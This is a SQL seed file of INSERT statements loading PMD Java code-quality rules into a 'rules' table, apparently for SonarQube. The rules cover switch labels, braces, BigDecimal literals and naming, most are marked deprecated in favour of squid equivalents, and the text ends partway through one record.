INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (204, 'Default label not last in switch statement', 'DefaultLabelNotLastInSwitchStmt', 'rulesets/java/design.xml/DefaultLabelNotLastInSwitchStmt', 'pmd', 'Switch statements should have a default label. Example :
  <pre>
public class Foo {
 void bar(int a) {
  switch (a) {
   case 1:  // do something
      break;
   default:  // the default case should be last, by convention
      break;
   case 2:
      break;
  }
 }
}
  </pre>

<p>
This rule is deprecated, use {rule:squid:SwitchLastCaseIsDefaultCheck} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811844, 1510817811845, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (205, 'Singular Field', 'SingularField', 'rulesets/java/design.xml/SingularField', 'pmd', 'A field that''s only used by one method could perhaps be replaced by a local variable.', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811846, 1510817811847, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (206, 'Avoid Print Stack Trace', 'AvoidPrintStackTrace', 'rulesets/java/logging-java.xml/AvoidPrintStackTrace', 'pmd', 'Avoid printStackTrace(); use a logger call instead.

<p>
This rule is deprecated, use {rule:squid:S1148} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811848, 1510817811848, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (207, 'Use Index Of Char', 'UseIndexOfChar', 'rulesets/java/strings.xml/UseIndexOfChar', 'pmd', 'Use String.indexOf(char) when checking for the index of a single character; it executes faster.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811849, 1510817811850, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (208, 'Use Collection Is Empty', 'UseCollectionIsEmpty', 'rulesets/java/design.xml/UseCollectionIsEmpty', 'pmd', 'The isEmpty() method on java.util.Collection is provided to see if a collection has any elements. Comparing the value of size() to 0 merely duplicates existing behavior.

<p>
This rule is deprecated, use {rule:squid:S1155} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811851, 1510817811851, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (209, 'Security - Method returns internal array', 'MethodReturnsInternalArray', 'rulesets/java/sunsecure.xml/MethodReturnsInternalArray', 'pmd', 'Exposing internal arrays directly allows the user to modify some code that could be critical. It is safer to return a copy of the array.

<p>
  This rule is deprecated, use {rule:squid:S2384} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811852, 1510817811853, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (210, 'Finalize Should Be Protected', 'FinalizeShouldBeProtected', 'rulesets/java/finalizers.xml/FinalizeShouldBeProtected', 'pmd', 'If you override finalize(), make it protected. If you make it public, other classes may call it.

<p>
This rule is deprecated, use {rule:squid:S1174} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811854, 1510817811854, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (226, 'Excessive Parameter List', 'ExcessiveParameterList', 'rulesets/java/codesize.xml/ExcessiveParameterList', 'pmd', '<p>
Long parameter lists can indicate that a new object should be created to wrap the numerous parameters. Basically, try to group the parameters together.
</p>

<p>
This rule is deprecated, use {rule:squid:S00107} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811899, 1510817811899, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (211, 'Avoid Decimal Literals In Big Decimal Constructor', 'AvoidDecimalLiteralsInBigDecimalConstructor', 'rulesets/java/basic.xml/AvoidDecimalLiteralsInBigDecimalConstructor', 'pmd', 'One might assume that new BigDecimal(.1) is exactly equal to .1, but it is actually equal to .1000000000000000055511151231257827021181583404541015625. This is so because .1 cannot be represented exactly as a double (or, for that matter, as a binary fraction of any finite length). Thus, the long value that is being passed in to the constructor is not exactly equal to .1, appearances notwithstanding. The (String) constructor, on the other hand, is perfectly predictable: ''new BigDecimal(.1)'' is exactly equal to .1, as one would expect. Therefore, it is generally recommended that the (String) constructor be used in preference to this one.

<p>
  This rule is deprecated, use {rule:squid:S2111} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811856, 1510817811856, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (212, 'If Else Stmts Must Use Braces', 'IfElseStmtsMustUseBraces', 'rulesets/java/braces.xml/IfElseStmtsMustUseBraces', 'pmd', '<p>
Avoid using if..else statements without using curly braces.
</p>

<p>
This rule is deprecated, use {rule:squid:S00121} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811857, 1510817811858, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (213, 'Too many methods', 'TooManyMethods', 'rulesets/java/codesize.xml/TooManyMethods', 'pmd', 'A class with too many methods is probably a good suspect for refactoring, in order to reduce its complexity and find a way to have more fine grained objects.

<p>
  This rule is deprecated, use {rule:squid:S1448} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '3h', NULL, NULL, 'size', false, 'HTML', 1510817811859, 1510817811860, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (214, 'Default Package', 'DefaultPackage', 'rulesets/java/controversial.xml/DefaultPackage', 'pmd', 'Use explicit scoping instead of the default package private level.', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811861, 1510817811862, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (215, 'While Loops Must Use Braces', 'WhileLoopsMustUseBraces', 'rulesets/java/braces.xml/WhileLoopsMustUseBraces', 'pmd', '<p>
Avoid using ''while'' statements without using curly braces.
</p>

<p>
This rule is deprecated, use {rule:squid:S00121} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811863, 1510817811864, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (216, 'Avoid Prefixing Method Parameters', 'AvoidPrefixingMethodParameters', 'rulesets/java/controversial.xml/AvoidPrefixingMethodParameters', 'pmd', 'Prefixing parameters by ''in'' or ''out'' pollutes the name of the parameters and reduces code readability.
To indicate whether or not a parameter will be modify in a method, its better to document method
behavior with Javadoc. Example: 
<pre>
// Not really clear
public class Foo {
  public void bar(
      int inLeftOperand,
      Result outRightOperand) {
      outRightOperand.setValue(inLeftOperand * outRightOperand.getValue());
  }
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S00117} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811870, 1510817811871, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (217, 'Avoid Throwing Null Pointer Exception', 'AvoidThrowingNullPointerException', 'rulesets/java/strictexception.xml/AvoidThrowingNullPointerException', 'pmd', 'Avoid throwing a NullPointerException - it''s confusing because most people will assume that the virtual machine threw it. Consider using an IllegalArgumentException instead; this will be clearly seen as a programmer-initiated exception.

<p>
This rule is deprecated, use {rule:squid:S1695} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811872, 1510817811873, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (218, 'Avoid Using Volatile', 'AvoidUsingVolatile', 'rulesets/java/controversial.xml/AvoidUsingVolatile', 'pmd', 'Use of the keyword "volatile" is general used to fine tune a Java application, and therefore, requires a good expertise of the Java Memory Model. Morover, its range of action is somewhat misknown. Therefore, the volatile keyword should not be used for maintenance purpose and portability.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811877, 1510817811879, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (219, 'Ternary operator with a boolean literal can be simplified with a boolean expression', 'SimplifiedTernary', 'rulesets/java/basic.xml/SimplifiedTernary', 'pmd', '<p>
  Look for ternary operators with the form condition ? literalBoolean : foo or condition ? foo : literalBoolean.
</p>

<p>Examples:</p>
<pre>
public class Foo {
  public boolean test() {
    return condition ? true : something(); // can be as simple as return condition || something();
  }

  public void test2() {
    final boolean value = condition ? false : something(); // can be as simple as value = !condition && something();
  }

  public boolean test3() {
    return condition ? something() : true; // can be as simple as return !condition || something();
  }

  public void test4() {
    final boolean otherValue = condition ? something() : false; // can be as simple as condition && something();
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811882, 1510817811886, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (220, 'Assignment In Operand', 'AssignmentInOperand', 'rulesets/java/controversial.xml/AssignmentInOperand', 'pmd', 'Avoid assignments in operands; this can make code more complicated and harder to read.

<p>
This rule is deprecated, use {rule:squid:AssignmentInSubExpressionCheck} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811888, 1510817811888, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (221, 'Use Varargs', 'UseVarargs', 'rulesets/java/design.xml/UseVarargs', 'pmd', 'Java 5 introduced the varargs parameter declaration for methods and constructors.  This syntactic 
sugar provides flexibility for users of these methods and constructors, allowing them to avoid 
having to deal with the creation of an array. Example: 
<pre>
public class Foo {
   public void foo(String s, Object[] args) {
      // Do something here...
   }

   public void bar(String s, Object... args) {
      // Ahh, varargs tastes much better...
   }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811889, 1510817811890, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (222, 'Android - Do Not Hard Code SD Card', 'DoNotHardCodeSDCard', 'rulesets/java/android.xml/DoNotHardCodeSDCard', 'pmd', 'Use Environment.getExternalStorageDirectory() instead of "/sdcard".', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811891, 1510817811892, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (223, 'Duplicate Imports', 'DuplicateImports', 'rulesets/java/imports.xml/DuplicateImports', 'pmd', 'Avoid duplicate import statements.

<p>
This rule is deprecated, use {rule:squid:UselessImportCheck} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811893, 1510817811894, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (224, 'Non Case Label In Switch Statement', 'NonCaseLabelInSwitchStatement', 'rulesets/java/design.xml/NonCaseLabelInSwitchStatement', 'pmd', 'A non-case label (e.g. a named break/continue label) was present in a switch statement. This legal, but confusing. It is easy to mix up the case labels and the non-case labels.

<p>
This rule is deprecated, use {rule:squid:S1219} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811895, 1510817811895, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (225, 'Coupling between objects', 'CouplingBetweenObjects', 'rulesets/java/coupling.xml/CouplingBetweenObjects', 'pmd', 'This rule counts unique attributes, local variables and return types within an object. A number higher than specified threshold can indicate a high degree of coupling.

<p>
This rule is deprecated, use {rule:squid:S1200} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2h', NULL, NULL, NULL, false, 'HTML', 1510817811896, 1510817811897, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (227, 'Clone Method Must Implement Cloneable (With Type Resolution)', 'CloneMethodMustImplementCloneableWithTypeResolution', 'rulesets/java/typeresolution.xml/CloneMethodMustImplementCloneable', 'pmd', 'The method clone() should only be implemented if the class implements the Cloneable interface with the exception 
of a final method that only throws CloneNotSupportedException. This version uses PMD''s type resolution facilities, 
and can detect if the class implements or extends a Cloneable class. Example: 
<pre>
public class MyClass {
  public Object clone() throws CloneNotSupportedException {
    return foo;
  }
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S1182} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811901, 1510817811902, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (228, 'Unnecessary parentheses', 'UnnecessaryParentheses', 'rulesets/java/controversial.xml/UnnecessaryParentheses', 'pmd', 'Sometimes expressions are wrapped in unnecessary parentheses, making them look like a function call. Example :
<pre>
public class Foo {
  boolean bar() {
    return (true);
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:UselessParenthesesCheck} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811905, 1510817811906, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (229, 'Long Variable', 'LongVariable', 'rulesets/java/naming.xml/LongVariable', 'pmd', 'Detects when a field, formal or local variable is declared with a long name.

<p>
  This rule is deprecated, use {rule:squid:S00117} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811907, 1510817811907, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (230, 'Naming - Suspicious constant field name', 'SuspiciousConstantFieldName', 'rulesets/java/naming.xml/SuspiciousConstantFieldName', 'pmd', 'A field name is all in uppercase characters, which in Sun''s Java naming conventions indicate a constant. However, the field is not final. Example :
<pre>
public class Foo {
  // this is bad, since someone could accidentally
  // do PI = 2.71828; which is actualy e
  // final double PI = 3.16; is ok
  double PI = 3.16;
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S00116} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811909, 1510817811910, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (231, 'Avoid Using Octal Values', 'AvoidUsingOctalValues', 'rulesets/java/basic.xml/AvoidUsingOctalValues', 'pmd', 'Integer literals should not start with zero. Zero means that the rest of literal will be interpreted as an octal value.

<p>
This rule is deprecated, use {rule:squid:S1314} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811911, 1510817811911, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (232, 'Avoid Protected Field In Final Class', 'AvoidProtectedFieldInFinalClass', 'rulesets/java/design.xml/AvoidProtectedFieldInFinalClass', 'pmd', 'Do not use protected fields in final classes since they cannot be subclassed. Clarify your intent by using private or package access modifiers instead.

<p>
  This rule is deprecated, use {rule:squid:S2156} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811913, 1510817811914, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (233, 'Replace Enumeration With Iterator', 'ReplaceEnumerationWithIterator', 'rulesets/java/migrating.xml/ReplaceEnumerationWithIterator', 'pmd', 'Consider replacing this Enumeration with the newer java.util.Iterator

<p>
This rule is deprecated, use {rule:squid:S1150} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, NULL, false, 'HTML', 1510817811915, 1510817811916, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (243, 'Avoid Synchronized At Method Level', 'AvoidSynchronizedAtMethodLevel', 'rulesets/java/design.xml/AvoidSynchronizedAtMethodLevel', 'pmd', 'Method level synchronization can backfire when new code is added to the method. Block-level synchronization helps to ensure that only the code that needs synchronization gets it.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'multithreading', false, 'HTML', 1510817811934, 1510817811935, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (234, 'Non Static Initializer', 'NonStaticInitializer', 'rulesets/java/design.xml/NonStaticInitializer', 'pmd', 'A nonstatic initializer block will be called any time a constructor is invoked (just prior to invoking the constructor). While this is a valid language construct, it is rarely used and is confusing. Example :<br/><code>public class MyClass {<br/>// this block gets run before any call to a constructor {<br/>System.out.println("I am about to construct myself");<br/>}<br/>}</code>

<p>
This rule is deprecated, use {rule:squid:S1171} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811916, 1510817811917, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (235, 'Inefficient String Buffering', 'InefficientStringBuffering', 'rulesets/java/strings.xml/InefficientStringBuffering', 'pmd', 'Avoid concatenating non literals in a StringBuffer constructor or append().', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811919, 1510817811919, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (236, 'Naming - Suspicious equals method name', 'SuspiciousEqualsMethodName', 'rulesets/java/naming.xml/SuspiciousEqualsMethodName', 'pmd', 'The method name and parameter number are suspiciously close to equals(Object), which may mean you are intending to override the equals(Object) method. Example :
<pre>
public class Foo {
  public int equals(Object o) {
  // oops, this probably was supposed to be boolean equals
  }
  public boolean equals(String s) {
  // oops, this probably was supposed to be equals(Object)
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1201} instead.
